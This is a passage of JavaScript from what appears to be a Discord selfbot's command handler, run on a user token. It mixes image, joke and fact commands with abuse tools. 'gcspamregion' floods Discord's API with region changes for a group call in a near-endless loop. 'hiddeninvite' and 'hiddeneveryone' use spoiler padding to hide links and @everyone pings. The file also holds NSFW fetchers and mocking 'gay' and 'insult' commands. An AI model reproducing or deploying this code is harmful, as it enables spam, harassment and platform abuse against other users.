                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                message.edit({content: user.displayAvatarURL()})
                break

            case "serverlogo":
                var serverid = message.content.split(" ").slice(1).join(" ")
                if (!serverid) {return message.edit(`${lang.needidtarget}`)}
                var server = client.guilds.cache.get(serverid)
                if (!server) {return message.edit(`${lang.cannotfindtarget}`)}
                message.edit({content: server.iconURL()})
                break

            case "serverbanner":
                var serverid = message.content.split(" ").slice(1).join(" ")
                if (!serverid) {return message.edit(`${lang.needidtarget}`)}
                var server = client.guilds.cache.get(serverid)
                if (!server) {return message.edit(`${lang.cannotfindtarget}`)}
                message.edit({content: server.bannerURL()})
                break

            case "dog":
                var dog = await fetch('https://dog.ceo/api/breeds/image/random').then(response => response.json())
                message.edit({content: dog.message})
                break

            case "cat":
                var cat = await fetch('https://aws.random.cat/meow').then(response => response.json())
                message.edit({content: cat.file})
                break

            case "fox":
                var fox = await fetch('https://randomfox.ca/floof/').then(response => response.json())
                message.edit({content: fox.image})
                break

            case "meme":
                var response = await fetch('https://memocord.me/api/meme/')
                var json = await response.json()
                var memeurl = json.meme_list[0].url
                var response2 = await fetch(`https://memocord.me/cdn/meme/videos/${memeurl}`)
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: response2.body, name: "memecodeproject.mp4"}]})
                break

            case "wasted":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var avatar = user.displayAvatarURL({format: "png"})
                var response = await fetch(`https://some-random-api.ml/canvas/wasted?avatar=${avatar}`)
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: response.body, name: "wasted.png"}]})
                break

            case "pride":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var avatar = user.displayAvatarURL({format: "png"})
                var response = await fetch(`https://some-random-api.ml/canvas/misc/lgbt?avatar=${avatar}`)
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: response.body, name: "pride.png"}]})
                break

            case "triggered":
                var user = message.mentions.users.first()
                if (!user) {return message.edit(`${lang.mentionuser}`)}
                var avatar = user.displayAvatarURL({format: "png"})
                var response = await fetch(`https://some-random-api.ml/canvas/triggered?avatar=${avatar}`)
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: response.body, name: "triggered.gif"}]})
                break

            case "tweet":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=tweet&username=${message.author.username}&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "tweet.png"}]})
                break

            case "trumptweet":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=trumptweet&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "tweet.png"}]})
                break

            case "changemymind":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=changemymind&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "changemymind.png"}]})
                break

            case "ship":
                var user1 = message.mentions.users.first()
                var user2 = message.mentions.users.last()
                if (!user1) {return message.edit(`${lang.mentionuser}`)}
                if (!user2) {return message.edit(`${lang.mentionuser}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=ship&user1=${user1.displayAvatarURL({format: "png"})}&user2=${user2.displayAvatarURL({format: "png"})}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "ship.png"}]})
                break

            case "clyde":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=clyde&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "clyde.png"}]})
                break

            case "kannagen":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "kannagen.png"}]})
                break


            case "qrcode":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${args}`)
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: response.body, name: "qrcode.png"}]})
                break

            case "phcomment":
                var args = message.content.split(" ").slice(1).join(" ")
                var username = message.author.username
                if (!args) {return message.edit(`${lang.providemsg}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=phcomment&image=${message.author.displayAvatarURL({format: "png"})}&username=${username}&text=${args}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "phcomment.png"}]})
                break

            case "ytbcomment":
                var args = message.content.slice(12).trim();
                var username = message.author.username
                var response = await fetch(`https://some-random-api.ml/canvas/misc/youtube-comment?avatar=${message.author.displayAvatarURL({format: "png"})}&username=${username}&comment=${args}`);
                var buffer = await response.buffer();
                message.delete()
                message.channel.send({files: [{ attachment: buffer, name: 'ytbcomment.png' }]})
                break


            case "awooify":
                var args = message.mentions.users.first()
                if (!args) {return message.edit(`${lang.mentionuser}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=awooify&url=${args.displayAvatarURL({format: "png"})}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "awooify.png"}]})
                break

            case "baguette":
                var args = message.mentions.users.first()
                if (!args) {return message.edit(`${lang.mentionuser}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=baguette&url=${args.displayAvatarURL({format: "png"})}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "baguette.png"}]})
                break

            case "pikachu":
                var response = await fetch(`https://some-random-api.ml/img/pikachu`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "pikachu.png"}]})
                break

            case "panda":
                var response = await fetch(`https://some-random-api.ml/img/panda`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "panda.png"}]})
                break

            case "redpanda":
                var response = await fetch(`https://some-random-api.ml/img/red_panda`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "redpanda.png"}]})
                break

            case "duck":
                var response = await fetch(`https://random-d.uk/api/v2/random`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.url, name: "duck.png"}]})
                break

            case "koala":
                var response = await fetch(`https://some-random-api.ml/img/koala`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "koala.png"}]})
                break

            case "whoouldwin":
                var user1 = message.mentions.users.first()
                var user2 = message.mentions.users.last()
                if (!user1) {return message.edit(`${lang.mentionuser}`)}
                if (!user2) {return message.edit(`${lang.mentionuser}`)}
                var response = await fetch(`https://nekobot.xyz/api/imagegen?type=whowouldwin&user1=${user1.displayAvatarURL({format: "png"})}&user2=${user2.displayAvatarURL({format: "png"})}`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.message, name: "woudlyouwin.png"}]})
                break

            case "kangaroo":
                var response = await fetch(`https://some-random-api.ml/img/kangaroo`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "kangaroo.png"}]})
                break

            case "raccoon":
                var response = await fetch(`https://some-random-api.ml/img/raccoon`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "raccoon.png"}]})
                break

            case "whale":
                var response = await fetch(`https://some-random-api.ml/img/whale`)
                var json = await response.json()
                message.delete()
                message.channel.send(`${lang.hereis}`)
                message.channel.send({files: [{attachment: json.link, name: "whale.png"}]})
                break

            case "simpcard":
                var usered = message.mentions.users.first() || message.author
                fetch('https://some-random-api.ml/canvas/simpcard?avatar=' + usered.displayAvatarURL({format: 'png', size: 512}))
                    .then(res => res.buffer())
                    .then(buffer => {message.edit({files: [{attachment: buffer, name: "simpcard.png"}]})})
                    .catch(err => console.error(err));
                break

            case "hornycard":
                var usered = message.mentions.users.first() || message.author
                fetch('https://some-random-api.ml/canvas/horny?avatar=' + usered.displayAvatarURL({format: 'png', size: 512}))
                    .then(res => res.buffer())
                    .then(buffer => {message.edit({files: [{attachment: buffer, name: "hornycard.png"}]})})
                    .catch(err => console.error(err));
                break

            case "lolice":
                message.edit("Generating lolice image...")
                var av = message.author.displayAvatarURL({format: "png"})
                var res = await axios.get(`https://nekobot.xyz/api/imagegen?type=lolice&url=${av}`)
                message.edit(`${message.author} ${lang.hereis} ! \n${res.data.message}`)
                break

            case "forcenick":
                if (!message.member.permissions.has('MANAGE_NICKNAMES')) {return message.channel.send(`${lang.noperm}`);}
                var user = message.mentions.users.first()
                if (!user) return message.edit(`${lang.mentionuser}`)
                var args = message.content.split(" ").slice(2).join(" ")
                if (!args) return message.edit(`${lang.nonickname}`)
                setTimeout(() => {
                        message.guild.members.cache.get(user.id).setNickname(args)
                    }
                    , 1000)
                message.edit(`${lang.forcenicked}`)
                autoDeleteMiddleware(config)(message)
                break

            case "hiddeninvite":
                var args = message.content.split(" ").slice(1).join(" ")
                var texted= message.content.split(" ").slice(2).join(" ")
                if (!args) return message.edit(`${lang.providemsg}`)
                message.edit(`${texted}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||${args}`)
                break

            case "hiddeneveryone":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit(`${lang.providemsg}`)
                message.edit(`${args}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @everyone`)
                break

            case "groupfuckersettings":
                if (config.antigroupfucker == true) {
                    config.antigroupfucker = false
                    message.edit(`\`\`\`ini
${lang.fucksettings}

[OFF]
                        \`\`\``)
                } else {
                    config.antigroupfucker = true
                    message.edit(`\`\`\`ini
${lang.fucksettings}

[ON]
                        \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error)
                autoDeleteMiddleware(config)(message)
                break

            case "antigroupsettings":
                if (config.antigroup == true) {
                    config.antigroup = false
                    message.edit(`\`\`\`ini
${lang.antigroupsettings}

[OFF]
                        \`\`\``)
                } else {
                    config.antigroup = true
                    message.edit(`\`\`\`ini
${lang.antigroupsettings}

[ON]
                        \`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error)
                autoDeleteMiddleware(config)(message)
                break

            case "groupfuckerwl":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit(`${lang.groupidrequired}`)
                if (config.antigroupfuckerwhitelist.includes(args)) return message.edit(`${lang.alreadyblacklist}`)
                config.antigroupfuckerwhitelist.push(args)
                message.edit(`\`\`\`ini
${lang.groupfuckwl}

${lang.groupfuckblacklisted} [${args}]
                    \`\`\``)
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error)
                autoDeleteMiddleware(config)(message)
                break

            case "antigroupwl":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit(`${lang.groupidrequired}`)
                if (config.antigroupwhitelist.includes(args)) return message.edit(`${lang.alreadyblacklist}`)
                config.antigroupwhitelist.push(args)
                message.edit(`\`\`\`ini
${lang.groupwl}

${lang.groupblacklisted} [${args}]
                    \`\`\``)
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error)
                autoDeleteMiddleware(config)(message)
                break


            case "afksettings":
                if (config.afk == true) {
                    config.afk = false
                    message.edit(`\`\`\`ini
${lang.afksettings}

[OFF]
\`\`\``)
                } else {
                    config.afk = true
                    message.edit(`\`\`\`ini
${lang.afksettings}

${lang.afked} [ON]
\`\`\``)
                }
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "afkblacklist":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit(`${lang.useridrequired}`)
                if (config.afkblacklist.includes(args)) return message.edit(`${lang.alreadyblacklist}`)
                config.afkblacklist.push(args)
                message.edit(`\`\`\`ini
${lang.afksettings}

${lang.afkblacklisted} [${args}]
\`\`\``)
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "removeblacklist":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit("You need to provide a userid to remove from blacklist!")
                if (!config.afkblacklist.includes(args)) return message.edit("This userid is not blacklisted!")
                config.afkblacklist.splice(config.afkblacklist.indexOf(args), 1)
                message.edit(`\`\`\`ini
${lang.afksettings}

${lang.afkblacklisted} [${args}]
\`\`\``)
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "afkmsg":
                var args = message.content.split(" ").slice(1).join(" ")
                if (!args) return message.edit("You need to provide a message to set as AFK message!")
                config.afkmsg = args
                message.edit(`\`\`\`ini
${lang.afksettings}

${lang.afkmessage} [${args}]
\`\`\``)
                fs.writeFile("./config.json", JSON.stringify(config), (err) => console.error);
                autoDeleteMiddleware(config)(message)
                break

            case "voicemove":
                if (!message.member.voice.channel) {
                    message.reply(`${lang.needinvc}`)
                    return
                }
                var amount = parseInt(args[1]);
                if (isNaN(amount) || amount <= 0) {
                    message.reply(`${lang.validnumber}`)
                    return
                }
                var voiceChannels = message.guild.channels.cache.filter(c => c.type === 'GUILD_VOICE')
                var selectedChannels = voiceChannels.random(amount)
                selectedChannels.forEach(channel => {
                    if (channel.permissionsFor(message.guild.me).has('CONNECT') && channel.permissionsFor(message.guild.me).has('SPEAK')) {
                        message.member.voice.setChannel(channel).catch(console.error)
                    }
                })
                message.reply(`${lang.move1} ${amount} ${lang.move2} !`)
                autoDeleteMiddleware(config)(message)
                break

            case "reactuser":
                var user = message.mentions.users.first()
                if (!user) return message.reply(`${lang.mentionuser}`)
                var emoji = args[2]
                if (!emoji) return message.reply(`${lang.validemoji}`)
                var messages = await message.channel.messages.fetch({limit: 100})
                messages = messages.filter(m => m.author.id === user.id)
                messages.forEach(message => {message.react(emoji)})
                break

            case "gcspamregion":
                var args = message.content.split(" ").slice(1).join(" ")
                var regions = ["brazil", "rotterdam", "hongkong", "india", "japan", "russia", "singapore", "southafrica", "sydney", "us-central", "us-east", "us-south", "us-west"];
            function region(count, delay) {
                var randomRegion = regions[Math.floor(Math.random() * regions.length)];
                fetch(`https://discord.com/api/v9/channels/${args}/call`, {method: "PATCH", headers: {"Authorization": `${config.token}`, "Content-Type": "application/json"}, body: JSON.stringify({"region": `${randomRegion}`})})
                if (count > 0) {setTimeout(region, delay, count-1, delay)}}
                region(10000000000, 900);
                break

            case "dick":
                var mentionuser = message.mentions.users.first()
                if (!mentionuser) return message.edit(`${lang.mentionuser}`)

                var args = message.content.split(" ")
                var size
                if (args.length > 2) {
                    size = parseInt(args[2], 10)
                } else {
                    size = Math.floor(Math.random() * 12) + 1
                }
                var dick = "8" + "=".repeat(size) + "D";
                message.edit(`:eggplant: ${lang.penis1}: **${mentionuser.username}**\n ${lang.penis2} : ${dick}`)
                break

            case "gay":
                var mentionuser = message.mentions.users.first();
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var reponse;
                var args = message.content.split(" ");
                if (args.length > 2) {
                    reponse = args[2] + "%";
                } else {
                    reponse = Math.round(Math.random() * 100) + "%";
                }
                if (mentionuser.id === "921126770340683886" || mentionuser.id === "795785229699645491") reponse = "0%";
                message.edit(`:rainbow_flag: ${mentionuser.username} ${lang.gay1} **${reponse}**`)
                break

            case "iq":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`)
                var args = message.content.split(" ")
                var iq
                if (args.length > 2) {
                    iq = parseInt(args[2], 10);
                } else {
                    iq = Math.round(Math.random() * 200);
                }
                message.edit(`:brain: ${lang.testiq1} : **${mentionuser.username}**\n IQ : ${iq}`)
                break

            case "coronatest":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var
                    reponses = [`${lang.coroposi}`, `${lang.coronega}`],
                    reponse = reponses[Math.floor(Math.random() * reponses.length)]
                message.edit(`:microbe: ${lang.corona1} : **${mentionuser.username}**\n ${lang.result} : ${reponse}`)
                break

            case "insult":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                fetch("https://insult.mattbas.org/api/insult")
                    .then(res => {
                        if (!res.headers.get('content-type').includes('text/plain')) {throw new Error('Response is not plain text')}
                        return res.text()})
                    .then(text => { const insult = text.trim().split('\n')[0]
                        message.edit(`\`\`\`ini
${lang.insult1}

[${mentionuser.username}] ${insult}\`\`\``)
                    })
                break

            case "hug":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var hug = await neko.hug();
                message.edit(`:hugging: ${mentionuser.username} ${lang.hug1} ${message.author.username}! ${hug.url}`)
                break

            case "kiss":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var kiss = await neko.kiss();
                message.edit(`:kiss: ${mentionuser.username} ${lang.kiss1} ${message.author.username}! ${kiss.url}`)
                break

            case "slap":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var slap = await neko.slap();
                message.edit(`🔪 ${mentionuser.username} ${lang.slaped1} ${message.author.username}! ${slap.url}`)
                break

            case "pat":
                var mentionuser = message.mentions.users.first()
                if(!mentionuser) return message.edit(`${lang.mentionuser}`);
                var pat = await neko.pat();
                message.edit(`:hugging: ${mentionuser.username} ${lang.pated1} ${message.author.username}! ${pat.url}`)
                break

            case "8ball":
                var question = message.content.split(" ").slice(1)
                if (!question) {message.edit(`${lang.question1}`)
                    return
                }
                var reponses = [`${lang.yes}`, `${lang.no}`, `${lang.maybe}`, `${lang.idk}`, `${lang.cant}`, `${lang.idknow}`,]
                var reponse = reponses[Math.floor(Math.random() * reponses.length)];
                message.edit(`:8ball: **${question}**\n:8ball: **${reponse}**`)
                break

            case "coinflip":
                if (!args[1]) return message.edit(`${lang.coinflip1}`)
                var
                    reponses = ["Heads", "Tails"],
                    reponse = reponses[Math.floor(Math.random() * reponses.length)]
                message.edit(`:game_die: ${lang.coinflip2} : **${args[1]}**\n ${lang.result} : ${reponse}`)
                break

            case "wyr":
                fetch("https://would-you-rather-api.abaanshanid.repl.co/")
                    .then(res => {
                        if (!res.headers.get('content-type').includes('application/json')) {throw new Error('Response is not json')}
                        return res.json()})
                    .then(json => {
                        message.edit(`\`\`\`ini
${lang.wyr1} :

[${json.data}]\`\`\``)})
                break

            case "advice":
                fetch("https://api.adviceslip.com/advice")
                    .then(res => res.json())
                    .then(json => {
                        const advice = json.slip.advice;
                        message.edit(`\`\`\`ini
${lang.advice1} :
                        
[${advice}]\`\`\``)
                    })
                break

            case "topic":
                fetch('http://2.11.128.249:8045/topic')
                    .then(response => {
                        if (!response.ok) {throw new Error('Network response was not ok')}
                        return response.text()
                    })
                    .then(data => {
                        message.edit(`\`\`\`ini
${lang.topic1} :

[${data}]\`\`\``)})
                break

            case "numberfact":
                var number = message.content.split(" ").slice(1)
                if (!number) {message.edit(`${lang.number1}`)
                    return
                }
                fetch(`http://numbersapi.com/${number}`)
                    .then(res => {
                        if (!res.headers.get('content-type').includes('text/plain')) {throw new Error('Response is not plain text')}
                        return res.text()})
                    .then(text => {
                        const fact = text.trim().split('\n')[0]
                        message.edit(`\`\`\`ini
${lang.num1} :

[${fact}]\`\`\``)})
                break

            case "catfact":
                fetch("https://catfact.ninja/fact")
                    .then(res => res.json())
                    .then(json => {
                        const fact = json.fact;
                        message.edit(`\`\`\`ini
${lang.cat1} :

[${fact}]\`\`\``)})
                break

            case "dogfact":
                fetch("https://dog-api.kinduff.com/api/facts")
                    .then(res => res.json())
                    .then(json => {
                        const fact = json.facts[0];
                        message.edit(`\`\`\`ini
${lang.dog1} :

[${fact}]\`\`\``)})
                break

            case "joke":
                fetch("https://official-joke-api.appspot.com/random_joke")
                    .then(res => res.json())
                    .then(json => {
                        const setup = json.setup;
                        const punchline = json.punchline;
                        message.edit(`\`\`\`ini
${lang.joke1} :

[${setup}]\n\n[${punchline}]\`\`\``)})
                break

            case "bored":
                fetch("https://www.boredapi.com/api/activity")
                    .then(res => res.json())
                    .then(json => {
                        const activity = json.activity;
                        message.edit(`\`\`\`ini
${lang.activity1} :

[${activity}]\`\`\``)})
                break

            case "rickroll":
                message.edit(`\`\`\`ini

[RickRolling...] : 

We're no strangers to love
You know the rules and so do I (do I)
A full commitment's what I'm thinking of
You wouldn't get this from any other guy
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching, but you're too shy to say it (say it)
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it
And if you ask me how I'm feeling
Don't tell me you're too blind to see
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching, but you're too shy to say it (to say it)
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
\`\`\``)
                break

            case "tronald":
                fetch("https://api.tronalddump.io/random/quote")
                    .then(res => res.json())
                    .then(json => {
                        const quote = json.value;
                        message.edit(`\`\`\`ini
${lang.tronaldquote} :

[${quote}]\`\`\``)})
                break

            case "kanye":
                fetch("https://api.kanye.rest/")
                    .then(res => res.json())
                    .then(json => {
                        const quote = json.quote;
                        message.edit(`\`\`\`ini
${lang.kanyequote} :

[${quote}]\`\`\``)})
                break

            case "question":
                fetch("https://opentdb.com/api.php?amount=1")
                    .then(res => res.json())
                    .then(json => {
                        const question = json.results[0].question;
                        const answer = json.results[0].correct_answer;
                        message.edit(`\`\`\`ini
${lang.rdmquestion} :

[${question}]\n\n[${answer}]\`\`\``)})
                break

            case "quote":
                fetch("https://api.quotable.io/random")
                    .then(res => res.json())
                    .then(json => {
                        const quote = json.content;
                        const author = json.author;
                        message.edit(`\`\`\`ini
${lang.rdmquote} :

[${quote}]\n\n[${author}]\`\`\``)})
                break




            case "rps":
                var args = message.content.split(" ").slice(1).join(" ")
                if(!args) return message.edit(`${lang.rpsargs}`);
                var reponses = [`${lang.rock}`, `${lang.paper}`, `${lang.scissor}`,]
                var reponse = reponses[Math.floor(Math.random() * reponses.length)];
                message.edit(`:game_die: ${lang.rps1} : **${message.author}**\n ${lang.answer} : ${reponse}`)
                break

            case "dice":
                var reponses = ["1", "2", "3", "4", "5", "6"]
                var reponse = reponses[Math.floor(Math.random() * reponses.length)];
                message.edit(`:game_die: ${lang.dice1} : **${reponse}**`)
                break

            case "emojis":
                var emojis = message.guild.emojis.cache.map(e => e.toString()).join(" ")
                var chunks = emojis.match(/.{1,2000}/g)
                for (const chunk of chunks) {message.channel.send(chunk)}
                message.delete()
                break

            case "deathdate":
                var mentionuser = message.mentions.users.first()
                if (!mentionuser) return message.edit(`${lang.mentionuser}`);
                var
                    responseannee = 2023 + Math.floor(Math.random() * 78),
                    reponse = Math.floor(Math.random() * 31) + 1,
                    reponse2 = Math.floor(Math.random() * 12),
                    reponses2 = [`${lang.jan}`, `${lang.feb}`, `${lang.mar}`, `${lang.apr}`, `${lang.may}`, `${lang.jun}`, `${lang.jul}`, `${lang.aug}`, `${lang.sep}`, `${lang.oct}`, `${lang.nov}`, `${lang.dec}`];
                message.edit(`:skull_crossbones: ${lang.death1} : **${mentionuser.username}**\n ${lang.death2} : **${reponse} ${reponses2[reponse2]} ${responseannee}**`);
                break

            case "ass":
                var image = await nsfw.ass()
                message.edit(`<@${message.author.id}> ${lang.ass1} : 😘\n${image}`)
                break

            case "hentai":
                var image = await nsfw.hmidriff()
                message.edit(`<@${message.author.id}> ${lang.hentai1} : 😚\n${image}`)
                break

            case "anal":
                var anal = await nsfw.anal();
                message.edit(`<@${message.author.id}> ${lang.anal1} : 😍\n${anal}`)
                break

            case "pussy":
                var image = await nsfw.pussy()
                message.edit(`<@${message.author.id}> ${lang.pussy1} : 🤔 \n${image}`)
                break

            case "boobs":
                var image = await nsfw.boobs()
                console.log(image)
                message.edit(`<@${message.author.id}> ${lang.boobs1} \n${image}`)
                break

            case "serverinfo":
                let guild
                if (args.length > 1) {
                    guild = client.guilds.cache.find(g => g.id === args[1]);
                } else {
                    guild = message.guild;
                }
                if (!guild) {
                    return message.reply(`${lang.cannotfindtarget}`)
                }
                let serverInfo = {
                    'ID': guild.id,
                    'Name': guild.name,
                    'Owner': guild.owner ? guild.owner.user.tag : "unknown",
                    'Owner ID': guild.ownerId,
                    'Member Count': guild.memberCount,
                    'Bots': guild.members.cache.filter(member => member.user.bot).size,
                    'Roles': guild.roles.cache.size,
                    'Total Boosts': guild.premiumSubscriptionCount,
                    'Boost Level': guild.premiumTier,
                    'Text Channels': guild.channels.cache.filter(channel => channel.type === 'GUILD_TEXT').size,
                    'Voice Channels': guild.channels.cache.filter(channel => channel.type === 'GUILD_VOICE').size,
                    'Categories': guild.channels.cache.filter(channel => channel.type === 'GUILD_CATEGORY').size,
                    'Verification Level': guild.verificationLevel,
                    'MFA Security': guild.mfaLevel === 0 ? '2FA not required' : '2FA required',
                    'Large Guild': guild.large ? 'True' : 'False',
                    'Emoji Count': guild.emojis.cache.size,
                    'Features': guild.features.join('\n'),
                }
                let serverInfoStr = ""
                for (const property in serverInfo) {
                    serverInfoStr += `[${property}] ${serverInfo[property]}\n`
                }
                message.edit(`\`\`\`ini\n${serverInfoStr}\`\`\``)
                break

            case "memberinfo":
                var user = message.mentions.users.first() || message.author;
                message.edit(`\`\`\`ini
[User Information] : 
                        
${lang.name} : ${user.username}\n
${lang.discriminator} : ${user.discriminator}\n
ID : ${user.id}\n
${lang.createdon} : ${user.createdAt}\n
